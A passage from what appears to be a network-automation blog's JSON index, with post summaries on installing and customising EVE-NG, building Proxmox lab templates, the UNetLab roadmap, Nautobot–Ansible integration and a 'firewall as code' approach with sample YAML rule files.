unlock exclusive content focused on mastering Ansible for network automation. Dive into detailed tutorials and real-world use cases that will help you streamline your network configurations and automate complex tasks with ease. Stay ahead of the curve with practical insights and hands-on experience that will transform your approach to network management.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/27/ansible-automation-series/","title":"Ansible automation series"},{"categories":["learning-paths","automation"],"contents":"Installing an EVE-NG server is a task I encounter every time I need to prepare a new course. For this reason, I have created an Ansible playbook that, starting from an Ubuntu Linux Server 22.04 LTS installation, installs EVE-NG as seen in the previous chapters.\nThe playbook is available in the GitHub repository dedicated to DevNetOps courses. Therefore, let\u0026rsquo;s install Ansible and retrieve the playbook from the GitHub repository:\ngit clone https://github.com/dainok/courses cd courses python3 -m venv venv source venv/bin/activate pip install -r requirements.txt cd \u0026#34;EVE-NG setup\u0026#34; Continue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2024/07/27/automating-eve-ng-installation/","title":"Automating EVE-NG installation"},{"categories":["learning-paths","automation"],"contents":"Let\u0026rsquo;s delve into the most important part: customizing EVE-NG for DevNetOps. In particular, we will proceed to:\nConfigure an internal network dedicated to device management. Import the labs from the GitHub repository dedicated to DevNetOps courses. Compile and install Python 3.10 (not required in EVE-NG 6) Create a user dedicated to development, with a dedicated Pythonenvironment. Utilize Visual Studio Code for remote development on the EVE-NG server. Configure an Internal Management Network In automation, each lab we create requires a seemingly trivial yet essential characteristic: the IP addresses of the devices must be accessible from the automation system. If the EVE-NG PRO version has a native feature (NAT Cloud) that simplifies this, in EVE-NG CE, we need to find a strategy to achieve the same result.\nThe goal is to configure an additional network on EVE-NG that allows us to connect the management interfaces of the devices we will use for our labs, whether they are virtual (internal to EVE-NG) or physical (PLC and other external physical devices). The diagram below summarizes our intention:\nFirstly, let\u0026rsquo;s clarify the networking of EVE-NG and introduce some concepts in Linux in general.\nA Linux system represents its network interfaces with various names, typically prefixed (eth, ens\u0026hellip;) associated with an identifier number. Network interfaces can represent either a physical network card or a virtual network card. In our environment, we find that the physical network card is represented by eth0, but there are other network cards named pnet.\nWe can view the network interfaces of the system with one of the following commands:\nifconfig -a ip link The configured pnet interfaces are actually virtual switches (bridges) configured by default during installation:\nIn particular, we see that the bridge pnet0 is associated with the physical interface eth0. Or, in other words, anything associated with the bridge pnet0 will also be transmitted on the eth0 network. As we\u0026rsquo;ll see in the web interface, we can add Cloud networks. Cloud networks are simply the pnet bridges. In particular, the pnet0 network is also used for web access. In fact, the management IP address is associated with the bridge pnet0, as we can see using one of the following commands:\nifconfig pnet0 ip address show pnet0 We can then configure an IP address on the pnet9 network and connect the management interfaces of the devices to the Cloud9 network.\nEVE-NG, based on Ubuntu Linux Server 20.04 LTS, configures networks via the /etc/network/interfaces file. In particular, we need to configure the part related to the pnet9 bridge as follows:\nWe use the APIPA network, defined to be local. In this sense, in an Enterprise context, we have reasonable certainty of not overlapping with other networks. The remaining pnet2-9 interfaces can be deleted.\nWe can now reload the modified network configuration:\n/etc/init.d/networking restart If we ever want to associate a physical interface with this bridge, we need to add the line:\nbridge_ports eth1 Continue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2024/07/27/customizing-eve-ng/","title":"Customizing EVE-NG"},{"categories":["learning-paths","automation"],"contents":"EVE-NG is installed from packages downloaded from the official repository via APT. All the following commands should be executed by the root user via SSH.\nFirst, we add the official repository and the GPG key to verify the packages:\nwget -qO - https://www.eve-ng.net/focal/eczema@ecze.com.gpg.key | sudo apt-key add - cat \u0026amp;lt;\u0026amp;lt; EOF \u0026amp;gt; /etc/apt/sources.list.d/eve-ng.list deb [arch=amd64] http://www.eve-ng.net/focal focal main # deb-src [arch=amd64] http://www.eve-ng.net/focal focal main EOF Next, we can reload the repositories, upgrade the system, and install EVE-NG CE along with other packages we will use later:\napt-get update apt-get -y upgrade apt-get -y install build-essential dnsmasq eve-ng iptables-persistent libbz2-dev libffi-dev libgdbm-dev libncurses5-dev libnss3-dev libreadline-dev libsqlite3-dev libssl-dev python3-pip zlib1g-dev Continue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2024/07/27/installing-eve-ng-5/","title":"Installing EVE-NG 5"},{"categories":["learning-paths","automation"],"contents":"Now let\u0026rsquo;s see how to install Ubuntu Linux Server 20.04 LTS so that it can host EVE-NG.\nVirtual Environment In a virtual environment, typically VMware vSphere, I suggest creating a virtual machine with the following specifications:\nGuest OS family: Linux Guest OS version: Ubuntu Linux (64-bit) CPU: 4 Hardware virtualization: Expose hardware assisted virtualization to the guest OS Memory: 8 GB Hard disk: 50 GB CD/DVD Drive: select the ISO file of Ubuntu Linux Server 20.04 LTS previously uploaded to the ESXi server Continue reading the post on Patreon .\n","cover":"/images/vendors/linux.webp","permalink":"https://www.adainese.it/blog/2024/07/27/installing-ubuntu-linux/","title":"Installing Ubuntu Linux"},{"categories":["learning-paths","automation"],"contents":"Developing automations that interact with network devices requires having a development environment to test, learn, and experiment with frameworks, integrations, and automations. Virtualization over the years has allowed anyone to have realistic copies of network devices at their disposal. Today, anyone can, and should, have their own development environment.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2024/07/27/introduction-to-eve-ng-platform/","title":"Introduction to EVE-NG platform"},{"categories":["learning-paths","automation"],"contents":"To set up an EVE-NG environment, you\u0026rsquo;ll need some prerequisites in terms of knowledge, hardware, and software.\nSkills Generally, diving into the world of network automation requires a solid understanding of Linux system usage and management. Linux is the most flexible system, rich in terms of languages, libraries, and frameworks that simplify automation and integrations development. While I\u0026rsquo;ve designed this series of courses to be accessible to anyone in the IT field, having experience in managing Linux systems is undeniably helpful.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2024/07/27/prerequisites-for-eve-ng/","title":"Prerequisites for EVE-NG"},{"categories":["learning-paths","automation"],"contents":"Let\u0026rsquo;s prepare templates to generate nodes for our labs. We\u0026rsquo;ll start with VyOS , an open-source router and firewall. VyOS is available as a rolling release and can be downloaded from GitHub in ISO format. In this example, we\u0026rsquo;ll use the vyos-1.5-rolling-202407171706-amd64.iso image, downloaded to /usr/src on a Proxmox host.\nThe official documentation guides us on creating a VyOS node on Proxmox. We\u0026rsquo;ll go through the steps to create a VyOS template and a basic lab with two interconnected VyOS nodes.\nOn my Proxmox host, I\u0026rsquo;ve added an external disk named unetlab for storing ISO images:\npvesh get /nodes/proxmox1/storage pvesh is the CLI for using Proxmox\u0026rsquo;s REST APIs. Learning to use it now will simplify our future interactions with Proxmox hosts via API.\nReferencing the Proxmox documentation , we find the required location for the ISO file. Copy the downloaded file and import it:\ncp /usr/src/vyos-1.5-rolling-202407171706-amd64.iso /var/tmp/pveupload-0001 pvesh create /nodes/proxmox1/storage/unetlab/upload -content iso -filename vyos-1.5-rolling-202407171706-amd64.iso -tmpfilename /var/tmp/pveupload-0001 Verify the ISO file is available:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/26/creating-templates-for-proxmox/","title":"Creating templates for Proxmox"},{"categories":["learning-paths","automation"],"contents":"We now have all the elements needed to simulate an L1 link. Let\u0026rsquo;s create a simple lab with two interconnected VyOS nodes.\n1. Create an L1 network bridge First, create a network bridge that will simulate the L1 link. We will start by defining a naming convention for our network components:\npvesh create /nodes/proxmox1/network -iface unlbr1 -type bridge -autostart 1 pvesh set /nodes/proxmox1/network 2. Clone VyOS nodes from template Next, clone two VyOS nodes from the template and connect a second network interface to the newly created bridge:\npvesh create /nodes/proxmox1/qemu/9001/clone -newid 10001 -full 0 -name node-vyos1 pvesh create /nodes/proxmox1/qemu/9001/clone -newid 10002 -full 0 -name node-vyos2 pvesh set /nodes/proxmox1/qemu/10001/config -tags unl,root pvesh set /nodes/proxmox1/qemu/10002/config -tags unl,root pvesh set /nodes/proxmox1/qemu/10001/config -net1 virtio,bridge=unlbr1 pvesh set /nodes/proxmox1/qemu/10002/config -net1 virtio,bridge=unlbr1 Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/26/simulating-an-l1-link-in-proxmox/","title":"Simulating an L1 link in Proxmox"},{"categories":["learning-paths","automation"],"contents":"Proxmox offers various constructs for building virtual networks. We\u0026rsquo;ll focus on using bridges to emulate physical links, as we did in UNetLab v1.\nLinux bridges handle frames differently:\nBroadcast frames are forwarded to all ports. Multicast frames are forwarded to a subset of ports. Peer-to-peer frames are not forwarded. All other frames are forwarded to all ports. Key files in the Linux Kernel sources are br_input.c and br_sysfs_br.c.\nIn br_input.c, the br_handle_frame function decides whether to forward or discard frames based on the destination MAC address. Frames with destination 0x01 are always discarded. A mask called fwd_mask affects the function\u0026rsquo;s outcome in some cases.\nWe aim to introduce the mask concept for the 0x01 case as well.\nIn br_sysfs_br.c, the set_group_fwd_mask function sometimes prevents evaluating the group_fwd_mask. We will modify this to always evaluate the mask.\nWith a modified kernel, you can control the /sys/class/net/vmbr1/bridge/group_fwd_mask mask to enable or disable forwarding any packet. Our modified kernel allows values up to 65535, forwarding any frame, achieving our goal.\nCompiling the Kernel To compile a kernel for Proxmox, you\u0026rsquo;ll need a system with Proxmox VE installed.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/25/patching-the-proxmox-kernel/","title":"Patching the Proxmox kernel"},{"categories":["learning-paths","automation"],"contents":"During the development of the first version of UNetLab, I dedicated significant time to creating a flexible QEMU/KVM orchestrator. At that time, virtualization-ready images were rare. Choosing a specific QEMU version or parameter could determine the success or failure of virtualizing a particular device.\nYears later, the landscape has changed completely: virtualization is almost always an option, as vendors use virtualized environments to create labs. Most vendors now release images for both VMware and QEMU/KVM.\nHowever, IOU remains a topic of interest: a lightweight image simulating a Cisco IOS XE environment. We can think of IOU as a container that doesn\u0026rsquo;t use standard networking. It could potentially be transformed into a container, but that\u0026rsquo;s another story.\nBy foregoing IOU (and Dynamips), we can simplify virtualization management. Specifically, we can rely on an existing hypervisor. For years, I considered ESXi , but after the Broadcom acquisition , I explored other options. After analyzing various environments, including libvirt , I decided on Proxmox for several reasons:\nIt\u0026rsquo;s a type 2 hypervisor, allowing OS modifications if needed. It provides REST APIs, which we need to verify. It allows kernel modifications to simulate physical links. It\u0026rsquo;s well-supported and under active development. It\u0026rsquo;s open source. It scales horizontally and supports VXLAN. It natively supports LXC (though not Docker). Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/24/proxmox-optimizing-virtualization/","title":"Proxmox: optimizing virtualization"},{"categories":["learning-paths","automation"],"contents":"The idea behind UNetLab v2 was partly good, but some choices complicated the implementation and negatively impacted system performance. Specifically, managing UNetLab\u0026rsquo;s network in user space would have caused serious problems, even though it would have made horizontal scalability easier.\nMoreover, I had a significant doubt: does it make sense to implement a virtualization system today when several are maintained by companies far better than I could manage? Initially, I considered ESXi , but after the Broadcom acquisition , I leaned towards Proxmox . While ESXi would have required abandoning physical link simulation, Proxmox allows using the same strategy I used with UNetLab.\nUsing an existing hypervisor significantly simplifies development at the cost of a substantial sacrifice: unsupported systems like IOL and Dynamips would no longer be supported. While this isn\u0026rsquo;t a big issue for Dynamips, IOL has always been my preferred system for creating lightweight labs.\nUNetLab v3 Wishlist I should divide the list into functional and non-functional requirements, but for now, let\u0026rsquo;s compile a sort of wishlist together.\nIn my mind, a hypothetical UNetLab v3 wishlist includes:\nFree, open-source, community-driven Ability to easily share labs, template repositories, playbooks Support for Ansible, Nornir, NAPALM, Netmiko playbooks Unified but focus on network and security labs Multi-user, multi-tenant, multi-role (e.g., student/teacher) Easy scalability API-first approach, with CLI and web interface Lab Features:\nEach lab is isolated by default. Labs can be interconnected. Labs can be shared between users. A management network is deployed per lab. Management network is hidden in topology. Management network is reachable by all nodes. A DHCP server is deployed per lab. An Internet gateway can be deployed per lab. A fake internet gateway can be deployed. Labs are described by a human-readable YAML file. Labs could contain an inventory compatible with Ansible. Imported labs should allow selecting alternative templates if the existing ones are not available. Labs could be signed by users. Live changes (jitter, delay, interface up/down) should immediately reflect in the running lab. Marketplace: A place where users and teachers can share labs and learning paths. Automation: All relevant nodes within a lab should be reachable by automation software by default. Packet capture: Users should be able to capture packets from any specific interface. Scale-out: Labs could be run on multiple computing nodes. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/23/unetlab-v3-whishing-list/","title":"UNetLab v3: whishing list"},{"categories":["learning-paths","automation"],"contents":"I\u0026rsquo;ve been working with network simulators since around 2011 when I decided to pursue my CCIE R\u0026amp;S certification. Around that time, another pivotal event set me on the path of development: Cisco released a binary called IOL (IOS on Linux), which essentially simulated a Cisco IOS router. Unlike other solutions, the resources required to simulate this router were significantly lower.\nBack then, GNS3 was the only available option, which used Dynamips to emulate the hardware needed to run official IOS images. However, the emulated platforms were limited, and manual optimization was required to minimize resource usage. I faced two major issues that were deal-breakers for me:\nI was working with two different computers, and synchronizing the environment between them with GNS3 was complicated. The combination of GNS3 and Dynamips was unstable. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/22/iou-web-the-beginning/","title":"iou-web: the beginning"},{"categories":["learning-paths","automation"],"contents":"In recent years, my focus has shifted towards network automation. I still need a unified network emulator platform, but the prerequisites have evolved. Before diving into the new requirements, let\u0026rsquo;s highlight the limitations of UNetLab:\nPer Host Pod Limit: Each host can run up to 256 independent pods due to the console port limit. Per Lab Node Limit: Each pod/lab can run up to 127 nodes due to the console port limit. Per User Pod Limit: Each user can run only one pod/lab at a time due to the console port limit. Single Host: No support for distributed installations of UNetLab (OVS can be used, but many frame types are filtered by default). Config Management: Using expect scripts for getting and putting startup-configs is slow, non-predictive, and cannot cover all node types. No Support for Dynamips Serial Interfaces. No Topology Changes: Topology changes are not allowed while the lab is running, by design. The console port limit exists because each node console has a fixed port calculated as follows:\nts_port = 32768 + 128 * tenant_id + device_id Additionally, no more than 512 IOL nodes can run in the same lab because the device_id must be unique for each tenant.\nUNetLab v2 must address these issues and meet new requirements:\nRun a distributed lab (across local or geographically distributed nodes). Support an unlimited number of nodes in a lab. Allow each user to customize a lab without affecting the original copy. Link serial interfaces between IOL and Dynamips. Configure nodes via Ansible/NAPALM/other tools. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/22/unetlab-v2-addressing-limitations/","title":"UNetLab v2: addressing limitations"},{"categories":["learning-paths","automation"],"contents":"In 2013, I realized that iou-web was too limited. I needed a \u0026ldquo;unified\u0026rdquo; approach to emulate a network, including firewalls, load balancers, and more. Additionally, multicasting using IOL was problematic. I had several new prerequisites:\nInclude vendor virtual appliances in labs. Integrate real IOS images in labs. Possibly include emulators from different vendors. Support multi-user environments. I completely rewrote iou-web to create an extendable network emulator system. The core idea was:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/22/unetlab-the-evolution-of-iou-web/","title":"UNetLab: the evolution of iou-web"},{"categories":["learning-paths","automation"],"contents":"For anyone working in IT, theory alone isn\u0026rsquo;t enough. Practical experience is crucial to fully grasp concepts and develop the skills needed to design, configure, and manage complex environments. In the early 2000s, network administrators often bought second-hand hardware to build labs for studying and experimenting with configurations before deploying them in production.\nThen came virtualization, which greatly simplified the process and made the concept of a lab accessible to many without the need for expensive hardware. Initially used by network administrators, simulators have since become foundational for the training of all IT professionals.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/20/network-simulators-are-a-must/","title":"Network simulators are a must"},{"categories":["learning-paths","automation"],"contents":"Join me as I embark on an exciting journey to develop UNetLab v3! On this Patreon series, you\u0026rsquo;ll get an exclusive behind-the-scenes look at the evolution of UNetLab, from initial concepts to advanced configurations.\nUNetLab (Unified Networking Labs) is a comprehensive network emulation tool that allows users to build complex network topologies in a virtualized environment. It has been widely used by network engineers, IT professionals, and students to simulate real-world network scenarios without the need for physical hardware.\nThis Patreon collection offers a comprehensive, step-by-step guide to recreating UNetLab from scratch. Join us to explore each stage of the development process in detail, from initial setup to advanced configurations. You\u0026rsquo;ll gain exclusive insights into the creation and optimization of UNetLab, with detailed posts and updates that follow the journey in real-time. Perfect for enthusiasts and professionals eager to understand and contribute to the development of cutting-edge network emulation tools.\nDeveloping UNetLab v3 We\u0026rsquo;ll take you behind the scenes as we build and enhance this powerful network simulation platform. From initial setup to advanced features, follow our journey, challenges, and breakthroughs.\n01. Network simulators are a must 02. iou-web: the beginning 03. UNetLab: the evolution of iou-web 04. UNetLab v2: addressing limitations 05. UNetLab v3: whishing list 06. Proxmox: optimizing virtualization 07. Patching the Proxmox kernel (paid members only) 08. Creating templates for Proxmox 09. Simulating an L1 link in Proxmox 10. Testing stretched networks with Proxmox 11. Lab modeling for UNetLab v3 12. UNetLab v3 architecture 13. Preparing a Proxmox cluster for UNetLab v3 14. Preparing VyOS image for UNetLab v3 15. Developing UNetLab v3 with AI (LLM) Get Started Today By joining this Patreon series, you\u0026rsquo;ll gain exclusive access to a hands-on journey through the development of UNetLab. Follow along as we take you step by step through the evolution of this powerful network emulation tool.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/20/unetlab-v3-development-series/","title":"UNetLab v3 development series"},{"categories":["learning-paths","automation"],"contents":"Beyond the topics discussed in previous posts, my work on this project focused on four key areas:\nThe data structure of Nautobot Nautobot\u0026rsquo;s REST API Integrating Ansible with Nautobot Running Ansible playbooks from Nautobot Let\u0026rsquo;s dive into the challenges encountered and the solutions omitted from previous posts.\nNautobot\u0026rsquo;s data structure Effectively using Nautobot requires careful planning of the data structure to avoid costly changes later. Understanding this structure allows for simplifications in automation scripts.\nEach object in Nautobot is identified by a UUID, such as 2170a207-43b2-422a-a90d-51a4908b85fb. This choice allows any attribute to be changed without issues. Since the device identifier is a UUID and not a name, we must consider:\nCan two devices have the same name? Can two interfaces on the same device have the same name? Quick tests reveal that the answer is no to both questions, allowing for safe simplifications in automation scripts.\nDjango shell Nautobot is built on Django , a Python-based web application framework. Django provides a shell for easy interaction with the data structure.\nThe decision had to be made whether to develop automations using the shell or the REST API.\nThe shell can be invoked using the command:\nnautobot-server shell Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/12/key-insights-from-developing-nautobot-and-ansible-integrations/","title":"Key insights from developing Nautobot and Ansible integrations"},{"categories":["learning-paths","automation"],"contents":"Currently, it is not possible to execute Ansible playbooks directly from Nautobot. There are some proposals , but nothing concrete has been implemented yet.\nThe only option is to use an external orchestrator to run the playbook regularly or upon operator request. Here are some options:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/12/orchestrating-ansible-playbooks-for-nautobot-integration/","title":"Orchestrating Ansible playbooks for Nautobot integration"},{"categories":["learning-paths","automation"],"contents":"Now, we need to translate the interface roles defined in Nautobot into specific configurations for the switches. To achieve this, we will create an Ansible role that utilizes the inventory described in the previous post to configure the interfaces of each device.\nFetch Running Configuration First, we retrieve the current running configuration from the switch:\nOptimizing show running-config improves overall performance.\nCreate data structures Next, we generate data structures with necessary details from Nautobot:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/12/the-ansible-role-breakdown/","title":"The Ansible role breakdown"},{"categories":["learning-paths","automation"],"contents":"Integrating Ansible with Nautobot involves two main aspects:\nReading information from Nautobot using Ansible. Running Ansible playbooks to update device configurations. Let\u0026rsquo;s focus on the first point: to make Nautobot\u0026rsquo;s information available in Ansible, we need to use a dynamic inventory . Network to Code provides a specific Ansible collection for Nautobot that includes an inventory plugin. You can install this collection with:\nansible-galaxy collection install networktocode.nautobot Before configuring the inventory, ensure the following information is completed in Nautobot for your device:\nIP address for device access Username and password for device access Connection method used by Ansible to access the device Device interfaces with associated profiles Configure primary IP address To configure the management IP address, follow these steps:\nCreate a network prefix: Navigate to IPAM -\u0026gt; Prefixes -\u0026gt; Add:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/07/11/integrating-ansible-with-nautobot/","title":"Integrating Ansible with Nautobot"},{"categories":["learning-paths","automation"],"contents":"Welcome to our Patreon-exclusive series on Nautobot Automations! If you\u0026rsquo;re an IT professional, network engineer, or automation enthusiast, this is your gateway to mastering network automation using Nautobot.\nNautobot is an open-source Network Source of Truth and Network Automation Platform. It\u0026rsquo;s designed to centralize and streamline your network operations, making it an indispensable tool for modern infrastructure management. With Nautobot, you can automate repetitive tasks, manage your network more efficiently, and reduce human error.\nThis collection of posts is designed to transform how you manage your network infrastructure. We\u0026rsquo;ll guide you through setting up Nautobot, automating device configuration, integrating with tools like Ansible , and much more. Each post is packed with practical examples, best practices, and insider tips to help you master network automation. Join us on Patreon for exclusive content, early access, and personalized support as you elevate your automation skills and streamline your network operations. Let\u0026rsquo;s automate smarter, together!\nAutomating Interface Configurations with Ansible and Nautobot Integrate Nautobot with Ansible! We\u0026rsquo;ll dive into how to use Nautobot\u0026rsquo;s powerful network data platform in conjunction with Ansible to automate network configurations, manage infrastructure, and streamline workflows. Learn step-by-step techniques for setting up and executing automated operations to enhance your network management efficiency.\n01. Leveraging Nautobot as a SSOT 02. Choosing the foundation for our SSOT 03. Installing Nautobot in your lab environment 04. Populating our SSOT with Automation 05. Integrating Ansible with Nautobot 06. The Ansible role breakdown 07. Orchestrating Ansible playbooks for Nautobot integration 08. Key insights from developing Nautobot and Ansible integrations (paid members only) Get Started Today By joining this Patreon series, you\u0026rsquo;ll gain exclusive access to content that will elevate your network management skills. Stay ahead of the curve and become proficient in using Nautobot for network automation.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/11/nautobot-automation-series/","title":"Nautobot automation series"},{"categories":["learning-paths","automation"],"contents":"The first topic we need to address is selecting the software that will serve as the foundation for our SSOT (Single Source of Truth). Our ultimate goal is to create a data structure that consolidates all the critical information about our infrastructure, such as:\nVLANs, IP networks, IP addresses, VRFs (IPAM) Sites, physical and virtual devices Rack configuration and cabling Essentially, we\u0026rsquo;re looking for an IPAM (IP Address Management) tool that can also store various other types of data. Since this data structure will be the base for executing some automated workflows, it needs to be:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/10/choosing-the-foundation-for-our-ssot/","title":"Choosing the foundation for our SSOT"},{"categories":["learning-paths","automation"],"contents":"In this guide, we\u0026rsquo;ll walk through installing Nautobot in a lab environment. For production installation, please refer to the official documentation . Nautobot requires Python versions between 3.8 and 3.11. First, ensure you have the correct Python version:\n$ python3 -V Python 3.11.9 Next, create a dedicated Python environment:\nmkdir /opt/nautobot python3.11 -m venv /opt/nautobot/venv source /opt/nautobot/venv/bin/activate pip install --upgrade pip wheel setuptools pip install --no-binary=pyuwsgi nautobot We will use PostgreSQL as the database. After installing PostgreSQL, create a dedicated database and user for Nautobot:\n$ psql postgres create user nautobot with password \u0026#39;42f5de36abff\u0026#39;; create database nautobot; grant all privileges on database nautobot to nautobot; Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/10/installing-nautobot-in-your-lab-environment/","title":"Installing Nautobot in your lab environment"},{"categories":["learning-paths","automation"],"contents":"Every company should move away from using Excel sheets as databases for managing infrastructure and switch to a structured system as the foundation for operational workflows.\nThe goal is to have a single repository that contains all the infrastructure data, including:\nVLANs, IP networks, IP addresses, VRFs (IPAM) Sites, physical and virtual devices Rack configuration and cabling This type of data structure is often referred to as SSOT or Single Source Of Truth, implying that this database:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/10/leveraging-nautobot-as-a-ssot/","title":"Leveraging Nautobot as a SSOT"},{"categories":["learning-paths","automation"],"contents":"Now, we need to populate our Single Source of Truth (SSOT). Manually adding interfaces for each device is impractical. Hence, automating this process by reading device configurations and creating corresponding SSOT objects is essential.\nCurrently, there\u0026rsquo;s no official system for automatic device discovery. This led me to develop NetDoc years ago, though it\u0026rsquo;s currently exclusive to Netbox.\nLet\u0026rsquo;s create a simple automation to efficiently handle this task.\nTools We\u0026rsquo;ll Use:\nNetmiko for device connectivity and information retrieval. NTC Templates to parse information into structured data. Nautobot\u0026rsquo;s REST API to create SSOT objects. Assuming the device is manually created in our SSOT for convenience, our automation will focus solely on populating interfaces.\nLet\u0026rsquo;s proceed step-by-step to develop our automation.\nParameters Needed for Our Automation Our automation requires the following parameters to function effectively:\nnautobot_base_url: The URL to access Nautobot. nautobot_apikey: The API key for making REST API requests to Nautobot. host: The IP address of the physical device to be read. username: The username used to access the physical device. password: The password used to access the physical device. You can create the API key on Nautobot by navigating to User -\u0026gt; Profile -\u0026gt; API Tokens -\u0026gt; Add a token.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/07/10/populating-our-ssot-with-automation/","title":"Populating our SSOT with Automation"},{"categories":["automation","security","ciso"],"contents":"It has been about 6 years since the Automate IT² event organized by me and Gabriele Gerbino. During the event, Xavier Homes presented a case that fascinated me. Today we might call it: Firewall as Code.\nMy interest was not just in the elegance of the solution but also in the practical implications for operations and security.\nFor several years, I managed firewalls and now, as a consultant, I see many client implementations. All the installations I encounter have the same problems:\nHundreds of rules; Each rule is built based on the perception of the operator who creates it; No clear understanding, except for a brief description, of the origin and evolution of the rule; Likely obsolete rules remain configured because no one can confirm if they are necessary or not; Rules refer to decommissioned or reused systems, thereby introducing undefined risks; Rules are grouped and simplified solely to make operations easier (without any security assessment); Constant requests to add new rules without fully understanding what an application should or should not do; Impossibility to review due to the reasons above and because the rules change continuously; Enormous operational time spent managing the firewalls; No one can say if the policies comply with any security directives the company should have. While there is software intended to solve the above problems, these solutions are often:\nAnother patch for poorly designed processes; Complicated to use; So expensive that they are not economically sustainable for most companies. Let\u0026rsquo;s start from scratch by designing a process that addresses the problems described above, from which (and not the other way around) we derive a technology that allows us to manage our firewalls.\nIn the example shown, I used Palo Alto Networks firewalls. The reasons for this choice are:\nI am quite familiar with them; They have a configuration entirely exportable in text format (XML in particular); I can manipulate the configuration file and then apply it entirely at a later stage (commit). The approach we will see should be applicable to all firewalls that meet these three properties.\nThe Process The process I want to design is very simple:\nApplication managers define the operating rules of their applications in terms of necessary traffic flows; Security managers define high-level traffic policies between different security zones, based on a risk assessment; Security architects design, implement, and oversee the firewall solutions; Automation takes the requirements from (1), applies the constraints defined in (2), generates the rule base, and applies it to the firewalls. The operational activities of the security architects are limited to what is defined in (3). Specifically, application managers must define network requirements through files and make them available along with the application\u0026rsquo;s code or documentation (Git would be a good tool, but not the only one). Daily or on request, the automation updates the policies.\nThe Model As always, the modeling phase takes the most time. In the example, I assumed that:\nThe definition of services in terms of protocol/port/application is centralized and managed by the security architects. The reason is that choosing the application associated with a specific port requires specific knowledge of the firewall solution. The definition of security zones and their relationship with networks is centralized and managed by the security architects. The reason is that the concept of a security zone is linked to network design. Settings like logging and security profiles are managed by the security architects. Each application\u0026rsquo;s definition is done via two files: networks.yml and rules.yml. The maintenance of both files is the responsibility of the application manager. Here\u0026rsquo;s an example:\n# networks.yml networks: WWW: - 10.20.1.7/32 APP: - 10.20.2.15/32 DB: - 10.20.2.23/32 The above file defines three objects: WWW, APP, DB.\nrules: - destination-address: WWW service: HTTP description: | Allow HTTP external traffic to exposed web server. - destination-address: WWW service: HTTPS description: | Allow HTTPS external traffic to exposed web server. - source-address: WWW destination-address: APP service: HTTPS_8443 description: | Allow traffic from exposed web server to application server. - source-address: APP destination-address: DB service: MYSQL description: | Allow traffic from application server to database server. The above file defines the rules for a specific application. Services are defined in the centralized services.yml file:\nservices: HTTP: applications: web-browsing HTTPS: applications: ssl HTTPS_8443: protocol: tcp port: 8443 applications: ssl MYSQL: applications: mysql Security zones are mapped based on the rules defined in the network-zone_mapping.yml file:\nzones: servers: type: internal networks: - 10.20.2.0/24 dmz: type: internal networks: - 10.20.1.0/24 # Internet (catch all) internet: type: external networks: - 0.0.0.0/0 Implementation Approach To summarize the key points of the approach:\nSecurity architects need to be able to configure the firewalls in detail, and it\u0026rsquo;s unthinkable to replicate an interface with all necessary settings; Application managers need to be able to abstractly define traffic rules. The most practical approach is therefore:\nRead the updated configuration from the firewall; Delete all traffic rules and associated objects; Regenerate rules and objects from the files described above and add them to the cleaned configuration; Validate the configuration; Apply the configuration. The advantage of this approach is clear: I never have to worry about checking if an object exists, if it is correct, or if it is in the right position. This greatly simplifies the implementation.\nThere are, of course, disadvantages or constraints:\nRules must be written so that order does not matter; All rules must be defined by the files described above. Exceptions can obviously be made, but each special case will complicate the implementation.\nTools Once the model is defined, a tool must be chosen to translate the model into an actual configuration. In my evaluation, I focused on:\nAerleon (formerly Google Carpica) pan-os-python: official libraries developed by Palo Alto Networks pan-python: privately developed libraries on which pan-os-python is based (interesting, isn\u0026rsquo;t it?) PAN-OS XML API PAN-OS CLI After some attempts with the official pan-os-python library, I decided to take a different path because the library configures the firewall object by object, whereas my approach required manipulating the entire configuration file.\nI then explored pan-python, which 